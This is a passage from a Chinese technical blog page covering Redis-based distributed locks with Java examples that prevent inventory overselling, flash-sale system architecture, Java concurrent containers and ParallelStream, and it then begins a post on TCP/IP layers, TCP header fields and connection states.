<p>分布式锁的实现方法和JVM锁的实现方法类似，只是在实现JVM锁时，是将锁的状态保存在Java对象头中，而实现分布式锁时，是将锁的状态保存在一个外部服务中，这个外部服务可以使用数据库（如MySQL）、Redis、Zookeeper等数据存储服务实现。</p>
<p>具体实现方式：</p>
<ol>
<li><p>基于数据库的锁：这种方式通常是在数据库中创建一张锁表，需要获取锁的时候在这张表中插入一条记录，释放锁的时候则删除这条记录。这种方式实现简单，但是性能可能会受到影响。</p>
</li>
<li><p>基于Redis的锁：Redis提供了一些原子性的操作，比如<code>SETNX</code>，set if not exist， 可以利用这些特性来实现分布式锁。<code>SETNX</code>命令可以在键不存在的情况下设置键值对，如果键已经存在，则不做任何操作。这种方式性能较好，但是需要处理好锁的超时和续期问题。</p>
</li>
<li><p>基于Zookeeper的锁：Zookeeper提供了一种叫做顺序临时节点的机制，可以利用这个机制来实现分布式锁。要获取锁的线程创建一个临时节点，如果这个节点是所有节点中序号最小的，那么就认为这个线程获取了锁。这种方式性能较差，但是更加可靠，适合对一致性要求更高的场景。</p>
</li>
</ol>
<h3 id="分布式锁的基本要求"><a href="#分布式锁的基本要求" class="headerlink" title="分布式锁的基本要求"></a>分布式锁的基本要求</h3><p>要实现一个分布式锁，需要满足以下要求：</p>
<ol>
<li>支持互斥性：支持多个线程操作同一共享变量的互斥性。</li>
<li>支持阻塞与非阻塞：当线程获取分布式锁失败，分布式锁能够支持当前线程是阻塞或者非阻塞的特性。</li>
<li>支持可重入性：分布式锁能够支持同一线程同时多次获取同一个分布式锁的特性。</li>
<li>支持锁超时：为避免获取到分布式锁的线程意外退出，进而无法正常释放锁，导致其它线程无法正常获取到锁的情况，分布式锁需要支持超时机制，若加锁时长超过一定时间，锁就会自动释放。</li>
</ol>
<h3 id="CAP理论与分布式锁模型"><a href="#CAP理论与分布式锁模型" class="headerlink" title="CAP理论与分布式锁模型"></a>CAP理论与分布式锁模型</h3><p>CAP理论是分布式领域非常著名的理论，CAP理论由C、A、P三部分组成，每个字母的含义如下：</p>
<ol>
<li>C（Consistency）：一致性，表示在分布式环境下，所有节点在任意时刻都具有相同的数据。</li>
<li>A（Availability）：可用性，表示在分布式环境下，每个请求都能得到响应，但是不能保证能够获取到最新的数据。</li>
<li>P（Partition Tolerance）：分区容错性，表示在分布式环境下，当系统中的某个分区发生故障或通信中断时，其他分区可以继续运行，保持整个系统的正常工作。</li>
</ol>
<p>同时，CAP理论指出，在分布式环境下，不可能同时保证一致性、可用性和分区容错性，最多只能保证其中的两个特性。</p>
<p>在分布式系统中，必须保证分区容错性。</p>
<p>基于CAP理论可以进行分布式锁模型的设计，例如：</p>
<ol>
<li><p>基于Redis的AP架构模型</p>
<p>Redis先返回请求结果，再以异步的方式同步数据</p>
</li>
<li><p>基于Zookeeper的CP架构模型</p>
<p>当数据在大多数Zookeeper节点间同步完成后，才返回请求结果</p>
</li>
</ol>
<h3 id="基于Redis实现分布式锁"><a href="#基于Redis实现分布式锁" class="headerlink" title="基于Redis实现分布式锁"></a>基于Redis实现分布式锁</h3><p>在超卖问题的示例代码的基础上，进行优化得到可以确保如下条件的分布式锁：</p>
<ol>
<li><p>不会出现超卖</p>
<p>使用Redis的SETNX命令，该命令的返回结果是：</p>
<ul>
<li>1：Redis中不存在当前key，设置键值对成功</li>
<li>0：Redis中存在当前key，设置键值对失败</li>
</ul>
<p>使用该命令对应的函数存储当前获取锁的线程id，以是否返回1作为是否获取到锁的判断条件，可以确保每次只有一个线程获取到锁</p>
<p>同时为了保证可重入性，在每次获取锁之前先判断是否是自己持有的锁</p>
</li>
<li><p>不会因为线程异常退出导致锁无法释放</p>
<p>解决方法是</p>
<ol>
<li>引入try finally块</li>
<li>引入超时机制，为避免获取到锁之后没有执行设置超时机制，需要和SETNX命令共同以原子化的方式使用</li>
</ol>
</li>
</ol>
<p>修改后的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/order/v2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverSoldV2</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1001&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">THREAD_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;THREAD_ID&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">STOCK_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;100&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(String.valueOf(OverSoldV2.class));<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StringRedisTemplate stringRedisTemplate;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OverSoldV2</span><span class="hljs-params">(StringRedisTemplate stringRedisTemplate)</span> &#123;<br>        <span class="hljs-built_in">this</span>.stringRedisTemplate = stringRedisTemplate;<br>        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/submitOrder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submitOrder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> String.valueOf(Thread.currentThread().getId());<br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">isLocked</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, <span class="hljs-number">30</span>, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">if</span> (Boolean.FALSE.equals(isLocked)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;failure&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">stockString</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().get(PRODUCT_ID);<br>            <span class="hljs-keyword">if</span> (stockString == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(stockString.trim())) &#123;<br>                logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> Integer.parseInt(stockString);<br>            <span class="hljs-keyword">if</span> (stock &gt; <span class="hljs-number">0</span>) &#123;<br>                stock -= <span class="hljs-number">1</span>;<br>                stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;库存扣减成功，当前库存为：&quot;</span> + stock;<br>                logger.info(info);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            stringRedisTemplate.delete(THREAD_ID);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行JMeter测试任务，得到输出结果，可以看到不再发生对库存重复扣减，超卖问题被解决。</p>
<p><img src="/./Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20230521143353323.png" alt="image-20230521143353323"></p>
<p>虽然超卖问题已经解决，但是每次获取锁失败就直接返回，没有实现锁的阻塞性，要实现锁的阻塞性，一种简单的实现方式是使用自旋：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/order/v3&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverSoldV3</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1001&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">THREAD_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;THREAD_ID&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">STOCK_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;100&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(String.valueOf(OverSoldV3.class));<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StringRedisTemplate stringRedisTemplate;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OverSoldV3</span><span class="hljs-params">(StringRedisTemplate stringRedisTemplate)</span> &#123;<br>        <span class="hljs-built_in">this</span>.stringRedisTemplate = stringRedisTemplate;<br>        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/submitOrder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submitOrder</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> String.valueOf(Thread.currentThread().getId());<br>        <span class="hljs-type">Boolean</span> <span class="hljs-variable">isLocked</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, <span class="hljs-number">30</span>, TimeUnit.SECONDS);<br>        <span class="hljs-keyword">if</span> (Boolean.FALSE.equals(isLocked)) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                isLocked = stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, <span class="hljs-number">30</span>, TimeUnit.SECONDS);<br>            &#125; <span class="hljs-keyword">while</span> (Boolean.FALSE.equals(isLocked));<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">stockString</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().get(PRODUCT_ID);<br>            <span class="hljs-keyword">if</span> (stockString == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(stockString.trim())) &#123;<br>                logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> Integer.parseInt(stockString);<br>            <span class="hljs-keyword">if</span> (stock &gt; <span class="hljs-number">0</span>) &#123;<br>                stock -= <span class="hljs-number">1</span>;<br>                stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;库存扣减成功，当前库存为：&quot;</span> + stock;<br>                logger.info(info);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            stringRedisTemplate.delete(THREAD_ID);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用阻塞等待后，调整JMeter的请求数等于商品数（100），如果恰好消费完，说明锁的阻塞等待是有效的。</p>
<p>JMeter的线程参数配置如下图，开启了5个线程，每个线程循环20次，请求次数总共100次：</p>
<p><img src="/./Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20230521144244517.png" alt="image-20230521144244517"></p>
<p>运行JMeter测试任务，输出结果显示如下图：</p>
<p><img src="/./Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20230521144440514.png" alt="image-20230521144440514"></p>
<p>输出结果显示，确实是恰好消费完，说明锁的阻塞等待是有效的。</p>
<h1 id="秒杀系统架构"><a href="#秒杀系统架构" class="headerlink" title="秒杀系统架构"></a>秒杀系统架构</h1><h2 id="电商系统架构"><a href="#电商系统架构" class="headerlink" title="电商系统架构"></a>电商系统架构</h2><p>一个简化的电商系统架构由上到下分为客户端、网关层、负载均衡层、应用层和存储层。各层包含的应用和服务举例如下：</p>
<ol>
<li>客户端：PC网页端、APP、H5网页端、小程序。</li>
<li>网关层：系统网关，包括硬件网关和软件网关。</li>
<li>负载均衡层：Nginx等负载均衡服务器</li>
<li>应用层：涵盖接入服务和基础服务等<ol>
<li>接入服务：商品接入服务、会员接入服务、订单接入服务、收银接入服务、物流接入服务等</li>
<li>基础服务：商品服务、用户服务、订单服务、库存服务、价格服务、物流服务等</li>
</ol>
</li>
<li>存储层：数据库集群、缓存集群、ElastichSearch集群等</li>
</ol>
<p>各层的并发度估计：</p>
<ol>
<li>假设负载均衡层使用的是Nginx，Nginx的最大并发度大于10万，数量级是万</li>
<li>假设应用层使用的是Tomcat，Tomcat的最大并发度8百左右，数量级是百</li>
<li>假设存储层的缓存使用的是Redis，Redis的最大并发度5万左右，数量级是万</li>
<li>假设存储层的数据库使用的是MySQL，MySQL的最大并发度1千左右，数量级是千</li>
</ol>
<p>在设计系统架构时需要综合考虑系统各层的最大并发度和数量级。</p>
<p>其中，</p>
<p>在 Redis 缓存层面可以采用主从复制、集群模式等技术来提高数据读写的并发度和可靠性，同时合理选择缓存策略，避免缓存雪崩和缓存穿透等问题。</p>
<p>在 MySQL 数据库层面可以采用水平分库分表、索引优化、SQL 语句优化等方式来提高并发度和性能。</p>
<p>需要注意的是，在实际应用中，系统性能还受到其它多种因素的影响，例如硬件配置、网络带宽、业务规模和复杂度等。</p>
<h3 id="系统扩容"><a href="#系统扩容" class="headerlink" title="系统扩容"></a>系统扩容</h3><p>系统扩容包括垂直扩容和水平扩容。</p>
<p>从应用层的角度来看，垂直扩容是提升服务器的配置，水平扩容是增加服务器的数据。</p>
<h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>缓存包括本地缓存和集中式缓存。</p>
<p>本地缓存可以使用Guava Cache实现，集中式缓存可以使用Redis实现。</p>
<p>在实现中，读取数据的步骤是，先读取本地缓存，如果本地缓存中没有要读取的数据，就从集中式缓存中读取，如果集中式缓存中依然没有，则从数据库中读取，然后将数据依次存入集中式缓存和本地缓存。</p>
<h3 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h3><p>分库分表，顾名思义，就是将原本存储于单个数据库上的数据拆分到多个数据库，把原来存储在单张数据表的数据拆分到多张数据表中，实现数据切分。</p>
<p>分库分表的实现可以分为两种方式：垂直切分和水平切分。垂直切分是将数据库中的表按照业务划分，将功能相近的业务表独立出来，分开部署；水平切分是将单张数据表中的数据进行划分，分散成多张表存储到多台服务器。</p>
<h3 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h3><p>通常情况下，数据库的读操作远远多于写操作。通过读写分离，可以利用这一特点，将读操作分发给多个只负责读取数据的从服务器（读库），而将写操作发送给主服务器（写库）。这样一来，主服务器专注于处理写操作，而从服务器处理读操作，从而提高系统的整体性能和并发处理能力。</p>
<h2 id="秒杀系统的特点"><a href="#秒杀系统的特点" class="headerlink" title="秒杀系统的特点"></a>秒杀系统的特点</h2><p>秒杀系统的并发量存在瞬时凸峰，也叫做流量突刺现象。</p>
<p>秒杀系统的技术特点是：瞬时高并发、读多写少、流程简单。</p>
<p>秒杀系统的三个阶段是：</p>
<ol>
<li><p>预热阶段</p>
<p>用户会刷新秒杀页面，查看秒杀活动，用户的刷新操作可以使部分数据存储到Redis缓存中，所以称为预热。</p>
</li>
<li><p>秒杀阶段</p>
<p>秒杀阶段会产生瞬时的高并发流量，在这一阶段，要确保已经做好了服务的限流、熔断和降级等。</p>
</li>
<li><p>结算阶段</p>
</li>
</ol>
<p>秒杀系统的性能优化方案：</p>
<ol>
<li><p>异步解耦</p>
<p>将秒杀系统的整体流程进行拆分，通过队列的方式控制核心部分，实现异步解耦。</p>
</li>
<li><p>限流防刷</p>
<p>对秒杀系统的部分业务进行限流、熔断和降级处理。</p>
</li>
<li><p>资源控制</p>
<p>由于应用层能够承受的并发量比缓存的并发量少很多，所以在高并发系统中，可以使用OpenResty，由负载均衡层访问缓存。</p>
</li>
</ol>
<h1 id="同步容器"><a href="#同步容器" class="headerlink" title="同步容器"></a>同步容器</h1><p>Java 同步容器是指线程安全的集合类，一般用于多线程并发场景下对数据进行存取、读写等操作。它们通常是在普通容器的基础上实现了同步化措施，可以防止出现并发访问引起的数据异常或不一致性问题。</p>
<p>Java 同步容器主要有以下几种：</p>
<ol>
<li>Vector</li>
</ol>
<p>Vector 是一个数组式的容器类，它实现了线程安全和可增长性，并提供了与 ArrayList 类似的 API 接口。</p>
<ol start="2">
<li>Stack</li>
</ol>
<p>Stack 是一个继承自 Vector 类的栈类，它实现了线程安全的 push 和 pop 操作。由于使用较少，已经不推荐使用 Stack。</p>
<ol start="3">
<li>Hashtable</li>
</ol>
<p>Hashtable 是一个散列表，它实现了线程安全的 key-value 存储，与 HashMap 类似。但它相对效率较低，主要用于早期 JDK 版本中的兼容性需求。</p>
<ol start="4">
<li>ConcurrentHashMap</li>
</ol>
<p>ConcurrentHashMap 是 Java 5 引入的高性能散列表，它采用分段锁机制实现并发访问，支持大量的并发读写操作，适用于高并发场景下的数据存储和读写。</p>
<ol start="5">
<li>CopyOnWriteArrayList&#x2F;CopyOnWriteArraySet</li>
</ol>
<p>CopyOnWriteArrayList&#x2F;CopyOnWriteArraySet 是两个线程安全的集合类，它们通过复制源数据来实现并发读写。在有大量读操作但少量写操作的场景下，它们可以提供更好的性能和可靠性。</p>
<p>需要注意的是，在使用同步容器时，由于涉及到线程安全问题，需要仔细考虑同步措施、锁的粒度、并发处理能力等因素，以确保数据的正确性和稳定性。同时，也应该根据具体场景选择合适的容器类型和 API 接口。</p>
<p>同步容器类的演变<br>Map&#x2F;Set从无锁到同步<br>ArrayList<br>LinkedList<br>Collections.synchronizedXXX<br>CopyOnWriteList<br>队列<br>ConcurrentLinkedQueue<br>ConcurrentArrayQueue<br>LinkedBlockingQueue<br>Queue<br>ArrayBlockingQueue<br>TransferQueue<br>SynchronousQueue<br>DelayQueue</p>
<h1 id="分工问题的实现方式"><a href="#分工问题的实现方式" class="headerlink" title="分工问题的实现方式"></a>分工问题的实现方式</h1><p>Guarded Suspension模式</p>
<p>Thread-Pre-Message模式</p>
<p>生产者-消费者模式</p>
<p>两阶段终止模式</p>
<p>Worker-Thread模式</p>
<p>Balking模式</p>
<h1 id="ParallelStream"><a href="#ParallelStream" class="headerlink" title="ParallelStream"></a>ParallelStream</h1><p>ParallelStream 是 JDK 8 中新增的流式 API，它继承自 Java.util.stream.Stream 接口，并提供了并行流（Parallel Stream）处理能力。</p>
<p>与普通流不同的是，ParallelStream 可以利用多个线程（默认情况下是 ForkJoinPool 中的线程）来并行执行部分或全部流处理操作，以加速大容量数据的处理和分析。在并行流执行流处理操作时，它会将数据划分成多个小块，并分别交给不同的线程进行处理，在处理完成后再将结果合并返回。</p>
<p>ParallelStream 支持大部分 Stream 的 API 操作，例如 filter、map、reduce、sorted 等，只需要调用 parallel() 方法即可将一个普通流转换为并行流。需要注意的是，由于并行流涉及到多线程的协作，因此在使用 ParallelStream 时需要考虑线程安全和共享变量等问题，避免出现并发问题和数据异常。</p>
<p>以下是一个 ParallelStream 的示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; list = Arrays.asList(<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;scala&quot;</span>, <span class="hljs-string">&quot;ruby&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>);<br><span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> list.parallelStream().filter(str -&gt; str.length() &gt; <span class="hljs-number">4</span>).count();<br>System.out.println(count);<br></code></pre></td></tr></table></figure>

<p>以上代码演示了如何使用 ParallelStream 统计字符串列表中长度大于 4 的字符串数量。由于 ParallelStream 默认使用 ForkJoinPool 的线程池来执行并行计算，因此可以实现更高效的数据统计和分析。</p>
<h1 id="JMH"><a href="#JMH" class="headerlink" title="JMH"></a>JMH</h1><p>JMH解决什么问题<br>JMH插件安装<br>JMH吞吐量测试<br>JMH QPS&#x2F;TPS测试</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-07T13:37:05.000Z" title="2023/5/7 21:37:05">2023-05-07</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-10T00:58:04.662Z" title="2023/5/10 08:58:04">2023-05-10</time></span><span class="level-item">2 hours read (About 19656 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></p><div class="content"><h1 id="TCP-x2F-IP五层网络模型"><a href="#TCP-x2F-IP五层网络模型" class="headerlink" title="TCP&#x2F;IP五层网络模型"></a>TCP&#x2F;IP五层网络模型</h1><ol>
<li><strong>应用层</strong>：负责处理应用程序的特定通信细节。常见的应用层协议有HTTP（用于Web浏览器和服务器之间的通信）、SMTP（用于发送和接收电子邮件）和FTP（用于文件传输）等。</li>
<li><strong>传输层</strong>：负责在网络中传输数据。主要有两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的数据传输，确保数据完整性和顺序；UDP提供不可靠的、无连接的数据传输，速度快但可能丢失数据。</li>
<li><strong>网络层</strong>：负责将数据包在网络中进行路由和寻址。互联网协议（IP）是网络层的核心协议，负责将数据包传输到目标设备。此外，还有一些辅助协议，如ICMP（用于诊断网络问题）和IGMP（用于多播通信）等。</li>
<li><strong>数据链路层</strong>：负责在同一网络中传输数据帧。数据链路层协议负责将网络层的IP数据包封装为数据帧，并通过物理介质进行传输。常见的数据链路层协议有以太网、Wi-Fi和PPP等。</li>
<li><strong>物理层</strong>：负责在物理介质上进行数据传输。物理层定义了网络设备之间的电气、机械和时序规范，以及数据在物理介质上的编码方式。常见的物理介质有双绞线、光纤和无线电波等。</li>
</ol>
<h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><p>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的传输协议。</p>
<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><p>TCP报文（也称为TCP段或TCP数据包）是TCP协议中用于在网络中传输数据的基本单位。TCP报文包含了一个TCP首部和可选的数据部分。</p>
<p>TCP报文的首部格式如下：</p>
<ol>
<li><strong>源端口（Source Port，16位）</strong>：表示报文发送方的端口号。</li>
<li><strong>目的端口（Destination Port，16位）</strong>：表示报文接收方的端口号。</li>
<li><strong>序列号（Sequence Number，32位）</strong>：表示报文中数据的第一个字节的序列号。是TCP报文中每个字节的唯一编号。当发送方发送一个TCP报文时，它会为报文中的第一个字节分配一个序列号。序列号的主要作用是帮助接收方对乱序、重复或丢失的报文进行排序和处理，从而确保数据的顺序和完整性。</li>
<li><strong>确认号（Acknowledgment Number，32位）</strong>：表示期望收到对方下一个报文的序列号，只有当ACK标志位被设置时才有效。</li>
<li><strong>数据偏移（Data Offset，4位）</strong>：表示TCP首部的长度，以32位字（4字节）为单位。</li>
<li><strong>保留（Reserved，6位）</strong>：保留位，未使用，设置为0。</li>
<li><strong>控制位（Control Bits，6位）</strong>：包含了一系列控制标志，如URG（紧急指针有效）、ACK（确认号有效）、PSH（推送）、RST（复位连接）、SYN（同步序列号）、FIN（结束连接）等。</li>
<li><strong>窗口大小（Window Size，16位）</strong>：表示发送方当前可接收的数据量（以字节为单位）。</li>
<li><strong>校验和（Checksum，16位）</strong>：用于检测报文在传输过程中是否发生错误。</li>
<li><strong>紧急指针（Urgent Pointer，16位）</strong>：仅在URG标志位被设置时有效，表示紧急数据在报文中的偏移量。</li>
<li><strong>选项（Options，可选，长度可变）</strong>：包含了一些可选的TCP功能，如最大报文长度（MSS）、窗口扩大因子（Window Scale）和选择性确认（SACK）等。</li>
<li><strong>填充（Padding，可选，长度可变）</strong>：用于保证TCP首部的长度为32位字的整数倍。</li>
</ol>
<p>TCP报文首部后面的数据部分包含了实际要传输的数据。TCP通过将数据划分为多个报文并为每个报文分配一个唯一的序列号，实现了可靠的、面向连接的数据传输。</p>
<h2 id="TCP连接的状态"><a href="#TCP连接的状态" class="headerlink" title="TCP连接的状态"></a>TCP连接的状态</h2><p>TCP连接的建立、数据传输和断开过程涉及多种状态。以下是TCP连接状态的详细说明：</p>
<ol>
<li><strong>CLOSED</strong>：初始状态，表示没有建立连接，也没有活动的连接。</li>
<li><strong>LISTEN</strong>：服务器处于侦听状态，等待客户端发送连接请求。这是服务器主动打开的初始状态。</li>
<li><strong>SYN_SENT</strong>：客户端发送SYN报文后，进入SYN_SENT状态。这表示客户端已发送连接请求，等待服务器的回应。</li>
<li><strong>SYN_RECEIVED</strong>：服务器收到客户端的SYN报文后，发送自己的SYN报文和确认ACK报文，进入SYN_RECEIVED状态。这表示服务器已确认客户端的连接请求，等待客户端确认。</li>
<li><strong>ESTABLISHED</strong>：双方都收到并确认对方的SYN报文后，连接建立成功，进入ESTABLISHED状态。此时，双方可以开始数据传输。</li>
<li><strong>FIN_WAIT_1</strong>：当客户端完成数据传输并发送FIN报文后，进入FIN_WAIT_1状态。这表示客户端请求关闭连接，等待服务器的确认。</li>
<li><strong>FIN_WAIT_2</strong>：客户端收到服务器对FIN报文的确认ACK报文后，进入FIN_WAIT_2状态。此时，客户端等待服务器发送自己的FIN报文，表示服务器已完成数据传输。</li>
<li><strong>CLOSE_WAIT</strong>：服务器收到客户端的FIN报文后，进入CLOSE_WAIT状态。这表示服务器已确认客户端的关闭请求，但仍需等待服务器完成数据传输。</li>
